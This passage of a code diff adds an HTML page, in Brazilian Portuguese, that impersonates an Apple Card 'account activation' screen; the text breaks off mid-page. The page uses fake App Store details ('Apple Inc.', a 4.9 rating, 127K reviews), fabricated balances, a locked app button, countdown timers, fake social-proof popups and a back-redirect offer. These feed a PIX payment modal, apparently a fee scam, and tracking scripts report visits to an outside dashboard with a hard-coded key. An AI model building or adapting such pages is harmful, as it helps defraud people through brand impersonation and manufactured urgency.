@@ -1,0 +1,895 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <script src="../tracker.js" data-offer="apple-card" data-dashboard="https://dash.nexustemp.top" data-key="tk_dash_2026_secretX" defer=""></script>
+    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+<script>
+  window.pixelId = "6a34b5e951dbbcea6045170a";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script><script async="" defer="" src="js/pixel.js"></script>
+<script src="js/t.js" data-id="apple-card2" defer=""></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ativação de Conta — Apple Card</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&amp;display=swap" rel="stylesheet">
+    <style>
+        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+        :root{
+            --apple-black:#1D1D1F;--apple-blue:#0071E3;
+            --gray-100:#F5F5F7;--gray-200:#E8E8ED;--gray-300:#D2D2D7;
+            --gray-400:#86868B;--gray-500:#6E6E73;
+            --success:#34C759;--warning:#FF9F0A;--error:#FF3B30;
+            --surface:#FFFFFF;--pix-green:#32BCAD;
+        }
+        body{font-family:-apple-system,BlinkMacSystemFont,'Inter',sans-serif;background:var(--gray-100);color:var(--apple-black);-webkit-font-smoothing:antialiased;min-height:100vh;overflow-x:hidden}
+        .page{max-width:520px;margin:0 auto;min-height:100vh;background:var(--surface)}
+
+        /* ─── Loading Screen ─── */
+        .loading-screen{position:fixed;inset:0;background:var(--surface);z-index:9999;display:flex;flex-direction:column;align-items:center;justify-content:center;transition:opacity .4s ease}
+        .loading-screen.hide{opacity:0;pointer-events:none}
+        .loading-logo{width:48px;height:48px;margin-bottom:24px}
+        .loading-bar-wrap{width:220px;height:3px;background:var(--gray-200);border-radius:2px;overflow:hidden;margin-bottom:16px}
+        .loading-bar{height:100%;background:var(--apple-black);border-radius:2px;width:0;transition:width .6s ease}
+        .loading-msg{font-size:.8125rem;color:var(--gray-500);transition:opacity .3s;min-height:1.2em}
+
+        /* ─── Nav ─── */
+        .nav{display:flex;align-items:center;padding:14px 20px;border-bottom:.5px solid var(--gray-200);background:rgba(255,255,255,.92);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);position:sticky;top:0;z-index:100}
+        .nav-back{width:32px;height:32px;display:flex;align-items:center;justify-content:center;cursor:pointer;border:none;background:none}
+        .nav-back svg{width:14px;height:14px;fill:var(--apple-blue)}
+        .nav-title{flex:1;text-align:center;font-size:.9375rem;font-weight:700}
+        .nav-secure{display:flex;align-items:center;gap:4px;font-size:.7rem;color:var(--success);font-weight:600}
+        .nav-secure svg{width:12px;height:12px;fill:var(--success)}
+
+        /* ─── Info Strip ─── */
+        .info-strip{padding:10px 20px;background:var(--apple-blue);color:#fff;font-size:.75rem;font-weight:600;text-align:center;display:flex;align-items:center;justify-content:center;gap:6px}
+
+        /* ─── Progress mini ─── */
+        .progress-mini{height:3px;background:var(--gray-200)}
+        .progress-mini-bar{height:100%;background:var(--apple-blue);width:10%;transition:width .5s ease}
+
+        /* ─── Content ─── */
+        .content{padding:0 20px 100px}
+
+        /* App Store Card */
+        .appstore-card{margin:20px 0;background:var(--gray-100);border-radius:16px;overflow:hidden;border:1.5px solid var(--gray-200)}
+        .appstore-header{padding:20px;display:flex;gap:16px;align-items:center}
+        .app-icon{width:72px;height:72px;border-radius:16px;background:var(--apple-black);display:flex;align-items:center;justify-content:center;flex-shrink:0;box-shadow:0 4px 12px rgba(0,0,0,.15)}
+        .app-icon svg{width:36px;height:36px;fill:#fff}
+        .app-info{flex:1;min-width:0}
+        .app-name{font-size:1.0625rem;font-weight:700;margin-bottom:2px}
+        .app-dev{font-size:.75rem;color:var(--apple-blue);font-weight:500;margin-bottom:6px}
+        .app-rating{display:flex;align-items:center;gap:4px;font-size:.6875rem;color:var(--gray-400)}
+        .app-rating .stars{color:var(--warning);letter-spacing:1px}
+        .app-get-btn{padding:6px 20px;background:var(--apple-blue);color:#fff;border:none;border-radius:20px;font-size:.8125rem;font-weight:700;cursor:pointer;font-family:inherit;white-space:nowrap}
+        .app-get-btn.locked{background:var(--gray-300);color:var(--gray-500);cursor:not-allowed}
+
+        /* App Screenshots */
+        .app-screens{display:flex;gap:10px;padding:0 20px 16px;overflow-x:auto;-webkit-overflow-scrolling:touch;scrollbar-width:none}
+        .app-screens::-webkit-scrollbar{display:none}
+        .app-screen{width:140px;height:248px;border-radius:12px;background:var(--apple-black);flex-shrink:0;overflow:hidden;position:relative;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:16px}
+        .app-screen .screen-icon{width:40px;height:40px;border-radius:10px;background:rgba(255,255,255,.1);display:flex;align-items:center;justify-content:center;margin-bottom:10px}
+        .app-screen .screen-icon svg{width:20px;height:20px;fill:rgba(255,255,255,.8)}
+        .app-screen .screen-title{font-size:.6875rem;color:rgba(255,255,255,.9);font-weight:600;text-align:center;margin-bottom:4px}
+        .app-screen .screen-desc{font-size:.5625rem;color:rgba(255,255,255,.5);text-align:center;line-height:1.4}
+        .app-screen.highlight{background:linear-gradient(135deg,#0071E3,#005BB5)}
+
+        /* App Meta */
+        .app-meta{display:flex;justify-content:space-around;padding:14px 20px;border-top:1px solid var(--gray-200)}
+        .app-meta-item{text-align:center}
+        .app-meta-value{font-size:.8125rem;font-weight:700;color:var(--apple-black)}
+        .app-meta-label{font-size:.625rem;color:var(--gray-400);text-transform:uppercase;letter-spacing:.04em;margin-top:2px}
+
+        /* Activation Notice */
+        .activation-notice{margin:16px 0;padding:16px 18px;background:rgba(255,149,10,.06);border:1.5px solid rgba(255,149,10,.2);border-radius:14px;display:flex;gap:12px;align-items:flex-start}
+        .activation-notice .an-icon{width:36px;height:36px;border-radius:10px;background:rgba(255,149,10,.12);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+        .activation-notice .an-icon svg{width:18px;height:18px;fill:var(--warning)}
+        .activation-notice .an-text{font-size:.8125rem;line-height:1.5;color:var(--gray-500)}
+        .activation-notice .an-text strong{color:var(--apple-black)}
+
+        /* Features list */
+        .features-card{background:var(--surface);border:1.5px solid var(--gray-200);border-radius:16px;padding:20px;margin-bottom:16px}
+        .features-title{font-size:.8125rem;font-weight:700;text-transform:uppercase;letter-spacing:.5px;color:var(--gray-400);margin-bottom:14px}
+        .feature-row{display:flex;align-items:center;gap:12px;padding:10px 0;border-bottom:1px solid var(--gray-100)}
+        .feature-row:last-child{border-bottom:none}
+        .feature-icon-wrap{width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+        .feature-icon-wrap.blue{background:rgba(0,113,227,.1)}
+        .feature-icon-wrap.blue svg{fill:var(--apple-blue)}
+        .feature-icon-wrap.green{background:rgba(52,199,89,.1)}
+        .feature-icon-wrap.green svg{fill:var(--success)}
+        .feature-icon-wrap.orange{background:rgba(255,149,10,.1)}
+        .feature-icon-wrap.orange svg{fill:var(--warning)}
+        .feature-icon-wrap svg{width:16px;height:16px}
+        .feature-label{font-size:.8125rem;font-weight:500;flex:1}
+        .feature-badge{font-size:.625rem;font-weight:700;padding:3px 8px;border-radius:4px;text-transform:uppercase}
+        .feature-badge.locked{background:var(--gray-100);color:var(--gray-400)}
+        .feature-badge.active{background:rgba(52,199,89,.1);color:var(--success)}
+
+        /* Countdown card */
+        .countdown-card{margin:16px 0;padding:14px 18px;background:var(--apple-black);border-radius:14px;display:flex;align-items:center;justify-content:space-between}
+        .countdown-card .cc-label{font-size:.75rem;color:rgba(255,255,255,.6);font-weight:500}
+        .countdown-card .cc-title{font-size:.875rem;color:#fff;font-weight:600;margin-top:2px}
+        .countdown-card .cc-timer{font-size:1.5rem;font-weight:800;color:#fff;font-variant-numeric:tabular-nums;letter-spacing:1px}
+
+        /* Guarantee */
+        .guarantee-card{padding:16px;background:rgba(52,199,89,.06);border:1.5px solid rgba(52,199,89,.15);border-radius:14px;display:flex;gap:12px;margin-bottom:16px}
+        .guarantee-card .gc-icon{width:40px;height:40px;border-radius:12px;background:var(--success);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+        .guarantee-card .gc-icon svg{width:20px;height:20px;fill:#fff}
+        .guarantee-card .gc-text{font-size:.8125rem;line-height:1.5}
+        .guarantee-card .gc-text strong{color:var(--success)}
+
+        /* Payment section */
+        .pay-section{margin-top:20px}
+        .pay-card{background:var(--apple-black);border-radius:16px;padding:20px;color:#fff}
+        .pay-card-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px}
+        .pay-card-header .pch-title{font-size:.875rem;font-weight:700}
+        .pay-card-header .pch-badge{padding:4px 10px;background:var(--pix-green);border-radius:6px;font-size:.6875rem;font-weight:700;color:#fff}
+        .pay-card-price{text-align:center;margin-bottom:16px}
+        .pay-card-price .pcp-value{font-size:2rem;font-weight:800}
+        .pay-card-price .pcp-desc{font-size:.75rem;color:rgba(255,255,255,.5);margin-top:2px}
+
+        /* Pay button */
+        .pay-btn{display:block;width:100%;padding:18px;border:none;border-radius:14px;font-size:1.0625rem;font-weight:700;cursor:pointer;font-family:inherit;background:#fff;color:var(--apple-black);text-align:center;transition:all .3s ease;position:relative;overflow:hidden}
+        .pay-btn:hover{opacity:.9}
+        .pay-btn:active{transform:scale(.98)}
+        .pay-btn .shine{position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.15),transparent);animation:btnShine 3s ease infinite}
+        .pay-btn.loading .pay-btn-label{opacity:0}
+        .pay-btn.loading .shine{display:none}
+        .pay-btn.loading::after{content:'';position:absolute;top:50%;left:50%;width:24px;height:24px;margin:-12px;border:3px solid rgba(0,0,0,.2);border-top-color:var(--apple-black);border-radius:50%;animation:spin .8s linear infinite}
+        .pay-btn-label{display:flex;align-items:center;justify-content:center;gap:8px}
+
+        .pay-security{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:12px;font-size:.6875rem;color:rgba(255,255,255,.4)}
+        .pay-security svg{width:10px;height:10px;fill:rgba(255,255,255,.4)}
+
+        /* FAQ */
+        .faq{margin-top:20px}
+        .faq-title{font-size:.9375rem;font-weight:700;margin-bottom:12px}
+        .faq-item{border-bottom:1px solid var(--gray-200)}
+        .faq-q{display:flex;align-items:center;justify-content:space-between;padding:14px 0;cursor:pointer;font-size:.8125rem;font-weight:600}
+        .faq-q svg{width:16px;height:16px;fill:var(--gray-400);transition:transform .3s;flex-shrink:0}
+        .faq-q.open svg{transform:rotate(180deg)}
+        .faq-a{max-height:0;overflow:hidden;transition:max-height .3s ease;font-size:.8125rem;color:var(--gray-500);line-height:1.6}
+        .faq-a.open{max-height:200px}
+        .faq-a p{padding-bottom:14px}
+
+        /* Decline link */
+        .decline-link{display:block;text-align:center;padding:20px;font-size:.75rem;color:var(--gray-400);text-decoration:none;cursor:pointer}
+        .decline-link:hover{color:var(--gray-500)}
+
+        /* Social proof */
+        .social-proof{position:fixed;bottom:80px;left:50%;transform:translateX(-50%);max-width:340px;width:calc(100% - 40px);padding:10px 14px;background:var(--surface);border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.12);display:flex;align-items:center;gap:10px;font-size:.75rem;z-index:90;opacity:0;transform:translateX(-50%) translateY(20px);transition:all .4s ease;pointer-events:none}
+        .social-proof.show{opacity:1;transform:translateX(-50%) translateY(0)}
+        .sp-dot{width:8px;height:8px;border-radius:50%;background:var(--success);flex-shrink:0;animation:livePulse 2s ease infinite}
+        .sp-text{flex:1;color:var(--gray-500)}
+        .sp-text strong{color:var(--apple-black)}
+
+        /* Fixed bottom CTA */
+        .fixed-cta{position:fixed;bottom:0;left:0;right:0;padding:12px 20px;background:rgba(255,255,255,.95);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border-top:.5px solid var(--gray-200);z-index:95;transform:translateY(0);transition:transform .4s ease}
+        .fixed-cta button{display:block;width:100%;max-width:520px;margin:0 auto;padding:16px;border:none;border-radius:12px;font-size:1rem;font-weight:700;cursor:pointer;font-family:inherit;background:var(--apple-black);color:#fff}
+        .fixed-cta button:active{transform:scale(.98)}
+
+        /* ─── PIX Modal ─── */
+        .pix-overlay{position:fixed;inset:0;background:rgba(0,0,0,.5);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);z-index:999;opacity:0;visibility:hidden;transition:all .3s ease;display:flex;align-items:flex-end;justify-content:center}
+        .pix-overlay.active{opacity:1;visibility:visible}
+        .pix-modal{background:var(--surface);border-radius:20px 20px 0 0;width:100%;max-width:520px;max-height:92vh;overflow-y:auto;padding:0;transform:translateY(100%);transition:transform .4s cubic-bezier(.32,.72,0,1)}
+        .pix-overlay.active .pix-modal{transform:translateY(0)}
+        .pix-modal-handle{width:36px;height:4px;background:var(--gray-300);border-radius:2px;margin:10px auto 0}
+        .pix-modal-header{padding:16px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:.5px solid var(--gray-200)}
+        .pix-modal-header h3{font-size:1rem;font-weight:700}
+        .pix-modal-close{width:28px;height:28px;border-radius:50%;background:var(--gray-100);border:none;cursor:pointer;display:flex;align-items:center;justify-content:center}
+        .pix-modal-close svg{width:14px;height:14px;fill:var(--gray-500)}
+        .pix-modal-body{padding:20px}
+        .pix-timer-bar{display:flex;align-items:center;gap:8px;padding:10px 14px;background:rgba(255,149,10,.08);border-radius:10px;margin-bottom:20px;font-size:.8125rem}
+        .pix-timer-bar svg{width:16px;height:16px;fill:var(--warning);flex-shrink:0}
+        .pix-timer-bar .ptb-text{flex:1;color:var(--gray-500)}
+        .pix-timer-bar .ptb-time{font-weight:700;color:var(--warning);font-variant-numeric:tabular-nums}
+        .qr-container{display:flex;flex-direction:column;align-items:center;margin-bottom:20px}
+        .qr-wrapper{position:relative;width:220px;height:220px;padding:12px;background:#fff;border-radius:16px;border:2px solid var(--gray-200);margin-bottom:12px}
+        .qr-wrapper img{width:100%;height:100%;object-fit:contain;border-radius:8px}
+        .qr-wrapper .qr-apple-logo{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:44px;height:44px;background:#fff;border-radius:10px;display:flex;align-items:center;justify-content:center;box-shadow:0 2px 8px rgba(0,0,0,.1)}
+        .qr-wrapper .qr-apple-logo svg{width:22px;height:22px;fill:var(--apple-black)}
+        .qr-label{font-size:.75rem;color:var(--gray-500);text-align:center}
+        .copy-section{margin-bottom:20px}
+        .copy-section label{display:block;font-size:.75rem;font-weight:600;color:var(--gray-500);text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px}
+        .copy-box{display:flex;gap:8px}
+        .copy-input{flex:1;padding:12px 14px;background:var(--gray-100);border:1.5px solid var(--gray-200);border-radius:10px;font-family:'Courier New',monospace;font-size:.7rem;color:var(--apple-black);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;outline:none;cursor:text}
+        .copy-btn{padding:12px 20px;background:var(--apple-black);color:#fff;border:none;border-radius:10px;font-size:.8125rem;font-weight:600;cursor:pointer;font-family:inherit;white-space:nowrap;transition:all .2s}
+        .copy-btn:active{transform:scale(.96)}
+        .copy-btn.copied{background:var(--success)}
+        .pix-steps{margin-bottom:20px;padding:16px;background:var(--gray-100);border-radius:14px}
+        .pix-steps-title{font-size:.8125rem;font-weight:600;margin-bottom:12px}
+        .pix-step{display:flex;gap:10px;margin-bottom:10px;font-size:.8125rem;color:var(--gray-500);line-height:1.4}
+        .pix-step:last-child{margin-bottom:0}
+        .pix-step-num{width:22px;height:22px;border-radius:50%;background:var(--apple-black);color:#fff;font-size:.6875rem;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+        .pix-status{text-align:center;padding:16px;background:rgba(255,149,10,.06);border-radius:14px;margin-bottom:16px;transition:all .4s ease}
+        .pix-status .ps-icon{width:48px;height:48px;border-radius:50%;margin:0 auto 8px;display:flex;align-items:center;justify-content:center}
+        .pix-status .ps-icon.waiting{background:rgba(255,149,10,.12)}
+        .pix-status .ps-icon.waiting svg{fill:var(--warning)}
+        .pix-status .ps-icon.paid{background:rgba(52,199,89,.12)}
+        .pix-status .ps-icon.paid svg{fill:var(--success)}
+        .pix-status .ps-icon svg{width:24px;height:24px}
+        .pix-status .ps-title{font-size:.9375rem;font-weight:700;margin-bottom:2px}
+        .pix-status .ps-desc{font-size:.75rem;color:var(--gray-500)}
+        .pix-status-dot{display:inline-block;width:6px;height:6px;border-radius:50%;margin-right:4px;vertical-align:middle}
+        .pix-status-dot.waiting{background:var(--warning);animation:livePulse 1.5s ease infinite}
+        .pix-status-dot.paid{background:var(--success)}
+
+        /* ─── Back Redirect Modal ─── */
+        .br-overlay{position:fixed;inset:0;background:rgba(0,0,0,.6);backdrop-filter:blur(10px);z-index:9998;opacity:0;visibility:hidden;transition:all .3s;display:flex;align-items:center;justify-content:center;padding:20px}
+        .br-overlay.active{opacity:1;visibility:visible}
+        .br-modal{background:var(--surface);border-radius:20px;max-width:400px;width:100%;padding:28px;text-align:center;transform:scale(.9);transition:transform .3s}
+        .br-overlay.active .br-modal{transform:scale(1)}
+        .br-emoji{font-size:2.5rem;margin-bottom:12px}
+        .br-title{font-size:1.25rem;font-weight:800;margin-bottom:8px}
+        .br-desc{font-size:.875rem;color:var(--gray-500);line-height:1.5;margin-bottom:20px}
+        .br-price{font-size:1.5rem;font-weight:800;color:var(--success);margin-bottom:20px}
+        .br-btn-accept{display:block;width:100%;padding:16px;border:none;border-radius:14px;font-size:1rem;font-weight:700;cursor:pointer;background:var(--success);color:#fff;font-family:inherit;margin-bottom:10px}
+        .br-btn-accept:active{transform:scale(.98)}
+        .br-btn-decline{display:block;width:100%;padding:12px;border:none;background:none;font-size:.8125rem;color:var(--gray-400);cursor:pointer;font-family:inherit}
+
+        /* Animations */
+        @keyframes btnShine{0%{left:-100%}50%{left:100%}100%{left:100%}}
+        @keyframes livePulse{0%,100%{opacity:1}50%{opacity:.3}}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+        .fade-in{animation:fadeIn .4s ease both}
+    </style>
+</head>
+<body>
+
+<!-- Loading Screen -->
+<div class="loading-screen" id="loadingScreen">
+    <svg class="loading-logo" viewBox="0 0 24 24" fill="#1D1D1F"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"></path></svg>
+    <div class="loading-bar-wrap"><div class="loading-bar" id="loadingBar" style="width: 35%;"></div></div>
+    <div class="loading-msg" id="loadingMsg">Preparando sua conta...</div>
+</div>
+
+<!-- Main Page -->
+<div class="page" id="mainPage" style="display:none">
+
+    <!-- Nav -->
+    <nav class="nav">
+        <div class="nav-back" onclick="handleBack()"><svg viewBox="0 0 24 24"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"></path></svg></div>
+        <div class="nav-title">Ativação de Conta</div>
+        <div class="nav-secure"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"></path></svg> Seguro</div>
+    </nav>
+
+    <!-- Info Strip -->
+    <div class="info-strip">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="#fff"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
+        Ative sua conta para acessar o aplicativo Apple Card
+    </div>
+
+    <!-- Progress mini -->
+    <div class="progress-mini"><div class="progress-mini-bar"></div></div>
+
+    <div class="content">
+
+        <!-- App Store Card -->
+        <div class="appstore-card">
+            <div class="appstore-header">
+                <div class="app-icon">
+                    <svg viewBox="0 0 24 24"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"></path></svg>
+                </div>
+                <div class="app-info">
+                    <div class="app-name">Apple Card Brasil</div>
+                    <div class="app-dev">Apple Inc.</div>
+                    <div class="app-rating">
+                        <span class="stars">★★★★★</span> 4.9 · 127K avaliações
+                    </div>
+                </div>
+                <button class="app-get-btn locked" id="appGetBtn">Bloqueado</button>
+            </div>
+
+            <!-- Screenshots simulando funcionalidades -->
+            <div class="app-screens">
+                <div class="app-screen highlight">
+                    <div class="screen-icon"><svg viewBox="0 0 24 24"><path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2 .9-2 2v8c0 1.1.89 2 2 2h9zm-9-2h10V8H12v8zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"></path></svg></div>
+                    <div class="screen-title">Apple Wallet</div>
+                    <div class="screen-desc">Gerencie seu cartão e saldo em tempo real</div>
+                </div>
+                <!-- Dashboard desbloqueada -->
+                <div class="app-screen" style="background:#F5F5F7;padding:10px;justify-content:flex-start">
+                    <div style="width:100%;background:#1D1D1F;border-radius:8px;padding:8px 10px;margin-bottom:6px">
+                        <div style="display:flex;align-items:center;gap:6px;margin-bottom:6px"><div style="width:18px;height:18px;border-radius:4px;background:linear-gradient(135deg,#0071E3,#34C759);display:flex;align-items:center;justify-content:center"><svg width="10" height="10" viewBox="0 0 24 24" fill="#fff"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"></path></svg></div><span style="font-size:.55rem;color:#fff;font-weight:600">Apple Card</span></div>
+                        <div style="font-size:.5rem;color:rgba(255,255,255,.5)">Saldo disponível</div>
+                        <div style="font-size:.875rem;font-weight:800;color:#34C759" data-limite="">R$ 4.750,00</div>
+                    </div>
+                    <div style="display:flex;gap:4px;width:100%">
+                        <div style="flex:1;background:#fff;border-radius:6px;padding:6px;text-align:center"><div style="font-size:.5rem;color:#86868B">Limite</div><div style="font-size:.5625rem;font-weight:700;color:#1D1D1F" data-limite="">R$ 4.750,00</div></div>
+                        <div style="flex:1;background:#fff;border-radius:6px;padding:6px;text-align:center"><div style="font-size:.5rem;color:#86868B">Cashback</div><div style="font-size:.5625rem;font-weight:700;color:#34C759">3%</div></div>
+                    </div>
+                    <div style="width:100%;margin-top:6px;background:#fff;border-radius:6px;padding:6px">
+                        <div style="font-size:.5rem;color:#86868B;margin-bottom:3px">Atividades</div>
+                        <div style="display:flex;align-items:center;gap:4px;margin-bottom:3px"><div style="width:4px;height:4px;border-radius:50%;background:#34C759"></div><span style="font-size:.45rem;color:#6E6E73">Apple Pay ativo</span></div>
+                        <div style="display:flex;align-items:center;gap:4px"><div style="width:4px;height:4px;border-radius:50%;background:#0071E3"></div><span style="font-size:.45rem;color:#6E6E73">PIX habilitado</span></div>
+                    </div>
+                </div>
+                <div class="app-screen">
+                    <div class="screen-icon"><svg viewBox="0 0 24 24"><path d="M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z"></path></svg></div>
+                    <div class="screen-title">Apple Pay</div>
+                    <div class="screen-desc">Pagamentos por aproximação NFC</div>
+                </div>
+                <!-- Dashboard transações -->
+                <div class="app-screen" style="background:#F5F5F7;padding:10px;justify-content:flex-start">
+                    <div style="width:100%;background:#1D1D1F;border-radius:8px;padding:8px 10px;margin-bottom:6px">
+                        <div style="font-size:.55rem;color:#fff;font-weight:600;margin-bottom:4px">Transações</div>
+                        <div style="display:flex;align-items:center;gap:6px;padding:4px 0;border-bottom:1px solid rgba(255,255,255,.1)"><div style="width:16px;height:16px;border-radius:4px;background:rgba(52,199,89,.2);display:flex;align-items:center;justify-content:center"><svg width="8" height="8" viewBox="0 0 24 24" fill="#34C759"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"></path></svg></div><div style="flex:1"><div style="font-size:.45rem;color:#fff">App Store</div><div style="font-size:.4rem;color:rgba(255,255,255,.4)">Hoje</div></div><div style="font-size:.5rem;font-weight:600;color:#34C759">-R$29,90</div></div>
+                        <div style="display:flex;align-items:center;gap:6px;padding:4px 0;border-bottom:1px solid rgba(255,255,255,.1)"><div style="width:16px;height:16px;border-radius:4px;background:rgba(0,113,227,.2);display:flex;align-items:center;justify-content:center"><svg width="8" height="8" viewBox="0 0 24 24" fill="#0071E3"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"></path></svg></div><div style="flex:1"><div style="font-size:.45rem;color:#fff">PIX Recebido</div><div style="font-size:.4rem;color:rgba(255,255,255,.4)">Ontem</div></div><div style="font-size:.5rem;font-weight:600;color:#0071E3">+R$150,00</div></div>
+                        <div style="display:flex;align-items:center;gap:6px;padding:4px 0"><div style="width:16px;height:16px;border-radius:4px;background:rgba(255,149,10,.2);display:flex;align-items:center;justify-content:center"><svg width="8" height="8" viewBox="0 0 24 24" fill="#FF9F0A"><path d="M19 14V6c0-1.1-.9-2-2-2H3c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zm-2 0H3V6h14v8z"></path></svg></div><div style="flex:1"><div style="font-size:.45rem;color:#fff">Cashback</div><div style="font-size:.4rem;color:rgba(255,255,255,.4)">Semanal</div></div><div style="font-size:.5rem;font-weight:600;color:#FF9F0A">+R$12,50</div></div>
+                    </div>
+                    <div style="width:100%;background:#fff;border-radius:6px;padding:6px;text-align:center">
+                        <div style="font-size:.5rem;color:#86868B;margin-bottom:2px">Cartão Virtual</div>
+                        <div style="font-size:.5625rem;font-weight:700;color:#1D1D1F">**** 4821</div>
+                        <div style="font-size:.4375rem;color:#34C759;font-weight:600">Ativo</div>
+                    </div>
+                </div>
+                <div class="app-screen">
+                    <div class="screen-icon"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"></path></svg></div>
+                    <div class="screen-title">Segurança</div>
+                    <div class="screen-desc">Proteção avançada em todas as transações</div>
+                </div>
+            </div>
+
+            <!-- App Meta -->
+            <div class="app-meta">
+                <div class="app-meta-item">
+                    <div class="app-meta-value">4+</div>
+                    <div class="app-meta-label">Idade</div>
+                </div>
+                <div class="app-meta-item">
+                    <div class="app-meta-value">PT</div>
+                    <div class="app-meta-label">Idioma</div>
+                </div>
+                <div class="app-meta-item">
+                    <div class="app-meta-value">Apple</div>
+                    <div class="app-meta-label">Desenvolvedor</div>
+                </div>
+                <div class="app-meta-item">
+                    <div class="app-meta-value">14,5 MB</div>
+                    <div class="app-meta-label">Tamanho</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Activation Notice -->
+        <div class="activation-notice">
+            <div class="an-icon">
+                <svg viewBox="0 0 24 24"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"></path></svg>
+            </div>
+            <div class="an-text">
